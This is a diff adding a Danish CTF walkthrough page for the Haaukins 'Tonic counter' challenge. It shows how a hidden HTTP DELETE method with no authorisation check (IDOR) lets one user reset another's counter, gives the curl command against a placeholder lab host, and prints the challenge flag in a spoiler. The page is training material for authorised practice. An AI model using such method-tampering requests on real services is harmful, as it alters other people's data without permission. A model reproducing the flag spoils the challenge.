@@ -1,0 +1,46 @@
+<!doctype html>
+<html lang="da">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Haaukins: Tonic counter — tutorial (skjult DELETE-metode)</title>
+<meta name="description" content="Guide til Haaukins Tonic counter: UI&#x27;en viser kun POST, men REST-endpointet accepterer også en skjult DELETE — brug den til at nulstille en brugers tæller.">
+<link rel="canonical" href="https://lolcatatonia.github.io/haaukins-walkthroughs/tonic-counter.html">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Haaukins: Tonic counter — tutorial (skjult DELETE-metode)">
+<meta property="og:description" content="Guide til Haaukins Tonic counter: UI&#x27;en viser kun POST, men REST-endpointet accepterer også en skjult DELETE — brug den til at nulstille en brugers tæller.">
+<meta property="og:url" content="https://lolcatatonia.github.io/haaukins-walkthroughs/tonic-counter.html">
+<meta name="twitter:card" content="summary">
+<script type="application/ld+json">{"@context": "https://schema.org", "@type": "TechArticle", "headline": "Tonic counter", "description": "Guide til Haaukins Tonic counter: UI'en viser kun POST, men REST-endpointet accepterer også en skjult DELETE — brug den til at nulstille en brugers tæller.", "url": "https://lolcatatonia.github.io/haaukins-walkthroughs/tonic-counter.html", "inLanguage": "da", "about": {"@type": "Thing", "name": "Haaukins CTF"}}</script>
+<link rel="stylesheet" href="assets/style.css">
+</head>
+<body>
+<div class="wrap">
+<nav class="topnav"><a href="index.html">← Alle Haaukins-tutorials</a></nav>
+<h1>Tonic counter</h1>
+<p class="subtitle">UI'en viser kun 'Add', men serveren router også en skjult DELETE.</p>
+<div class="badges"><span class="badge cat">Web exploitation</span><span class="badge">Haaukins CTF</span></div>
+<div class="callout">🎓 <strong>Prøv selv først.</strong> Trinene viser metoden; det konkrete flag ligger i en sammenklappelig spoiler nederst. Haaukins-flag er ofte per-instans, så det er <em>fremgangsmåden</em> der tæller.</div>
+
+<h2>Hvad går opgaven ud på?</h2>
+<p>Hjælp "Alex P. Isaac" (bruger-ID 1) af med sin gæld på <code>tonic-counter.hkn</code>. UI'en har
+             kun en "Add a Tonic"-knap (<code>POST /tonic/&lt;id&gt;</code>), ingen fjern-knap.</p>
+<h2>Trin for trin</h2>
+<p>Endpointet er RESTful og understøtter flere metoder end UI'en viser:</p>
+             <pre><code>GET    /tonic/1  -> 405        POST /tonic/1 -> 200 (add)
+DELETE /tonic/1  -> 200 (REMOVE!)   <- skjult, intet autorisationstjek (IDOR)
+# nulstil Alex' gæld:
+curl -b &lt;cookie&gt; -X DELETE http://&lt;ip&gt;/tonic/1   # gentag til 0</code></pre>
+             <p>Når Alex' tæller er 0, viser dashboardet flaget. (Session-cookien udløber ~5 min → re-login.)</p>
+<details class="spoiler"><summary>🚩 Vis løsning &amp; eksempel-flag</summary>
+<p>Flag (per-instans): <span class="flag">HKN{2fi-nQ7-3EUQ}</span></p>
+</details>
+<h2>Hvad du har lært</h2>
+<ul><li>Prøv altid andre HTTP-metoder end UI'en bruger (DELETE/PUT/PATCH) — manglende metode-whitelist.</li><li>IDOR: intet tjek på hvem der må ændre en andens ressource.</li></ul>
+<footer>
+Del af <a href="index.html">Haaukins CTF-tutorials</a>. Materialet er løsningsstøtte til en autoriseret
+trænings-/CTF-kontekst — brug det til at lære, ikke til at springe læringen over.
+</footer>
+</div>
+</body>
+</html>
